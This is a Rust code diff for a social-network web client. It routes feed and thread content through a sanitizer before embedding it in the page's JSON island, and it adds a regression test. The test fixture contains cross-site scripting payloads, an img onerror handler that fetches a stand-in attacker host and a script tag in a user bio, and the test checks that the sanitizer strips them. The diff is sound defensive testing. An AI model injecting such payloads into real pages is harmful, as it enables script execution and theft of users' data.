@@ -247,9 +247,17 @@ pub fn feed(
     statuses: &[Status],
     cursor: Option<&str>,
 ) -> String {
+    let statuses: Vec<Status> = statuses
+        .iter()
+        .cloned()
+        .map(|mut status| {
+            nodus_ui::html::sanitize_status(&mut status);
+            status
+        })
+        .collect();
     let island = serde_json::to_string(&Island {
         which,
-        statuses,
+        statuses: &statuses,
         cursor,
     })
     .unwrap_or_else(|_| format!("{{\"which\":\"{which}\",\"statuses\":[],\"cursor\":null}}"));
@@ -270,10 +278,7 @@ pub fn feed(
             std::sync::Arc::new(move || leptos::html::div().inner_html(heading.clone()).into_any())
         };
         nodus_route::route::RouteView(nodus_route::route::RouteViewProps {
-            runtime: crate::runtime::StaticRuntime::page(
-                statuses.to_vec(),
-                cursor.map(str::to_owned),
-            ),
+            runtime: crate::runtime::StaticRuntime::page(statuses, cursor.map(str::to_owned)),
             route,
             card,
             header: Some(header),
@@ -293,15 +298,9 @@ pub fn feed(
 /// A thread: what came before, the status itself, then the replies.
 #[must_use]
 pub fn thread_page(assets: &Assets, acct: &str, status: &Status, context: &Context) -> String {
-    // The page itself is shared, so what is left here is the server's half of it: the content
-    // preparation, because `inner_html` carries whatever the caller hands it and the browser
-    // would only ever get the instance's own text.
     let paint = |status: &Status| -> Status {
         let mut painted = status.clone();
-        match painted.reblog.as_deref_mut() {
-            Some(inner) => inner.content = crate::content::prepared(&inner.content, &inner.emojis),
-            None => painted.content = crate::content::prepared(&painted.content, &painted.emojis),
-        }
+        nodus_ui::html::sanitize_status(&mut painted);
         painted
     };
     let painted_context = Context {
@@ -457,4 +456,94 @@ fn page(assets: &Assets, title: &str, body: &str, island: Option<&str>, noindex:
         script = escape(&assets.script),
         wasm = escape(&assets.wasm),
     )
+}
+
+#[cfg(test)]
+mod tests {
+    use nodus_client_core::model::{Account, CustomEmoji, Status, Visibility};
+
+    use super::{Assets, feed};
+
+    #[test]
+    fn feed_sanitizes_nodus_page_island_and_prevents_emoji_breakout() {
+        let assets = Assets {
+            script: "/nodus-web.js".to_owned(),
+            wasm: "/nodus-web_bg.wasm".to_owned(),
+            stylesheet: None,
+            stylesheet_css: None,
+        };
+        let status = Status {
+            id: "1".to_owned(),
+            created_at: "2026-01-01T00:00:00Z".to_owned(),
+            content: "<p>hi :wave: <a href=\"https://example.com/:wave:\">link</a></p>\
+                      <img src=x onerror=\"fetch('https://attacker.tld')\">"
+                .to_owned(),
+            visibility: Visibility::Public,
+            account: Account {
+                id: "1".to_owned(),
+                acct: "alice@example.org".to_owned(),
+                display_name: "Alice".to_owned(),
+                note: "<p>bio</p><script>steal()</script>".to_owned(),
+                avatar: String::new(),
+                header: String::new(),
+                bot: false,
+                locked: false,
+                followers_count: 0,
+                following_count: 0,
+                statuses_count: 0,
+                last_status_at: None,
+                discoverable: None,
+                indexable: None,
+                noindex: None,
+            },
+            favourites_count: 0,
+            reblogs_count: 0,
+            replies_count: 0,
+            favourited: false,
+            reblogged: false,
+            bookmarked: false,
+            reblog: None,
+            in_reply_to_id: None,
+            emojis: vec![CustomEmoji {
+                shortcode: "wave".to_owned(),
+                url: "https://cdn.test/wave.png".to_owned(),
+                static_url: None,
+            }],
+            url: None,
+            sensitive: false,
+            spoiler_text: String::new(),
+            language: None,
+            content_format: None,
+            content_source: None,
+            media_attachments: Vec::new(),
+            mentions: Vec::new(),
+            tags: Vec::new(),
+            poll: None,
+            edited_at: None,
+            pinned: None,
+        };
+
+        let html = feed(
+            &assets,
+            "me@example.org",
+            "home",
+            "Home",
+            "/home",
+            &[status],
+            None,
+        );
+        let (_, after_open) = html
+            .split_once("<script id=\"nodus-page\" type=\"application/json\">")
+            .expect("island script present");
+        let (island_json, _) = after_open.split_once("</script>").expect("closing script");
+
+        assert!(!island_json.contains("onerror"), "{island_json}");
+        assert!(!island_json.contains("attacker.tld"), "{island_json}");
+        assert!(!island_json.contains("<script"), "{island_json}");
+        assert!(!island_json.contains("steal()"), "{island_json}");
+        assert!(
+            html.contains("href=\"https://example.com/:wave:\""),
+            "{html}"
+        );
+    }
 }
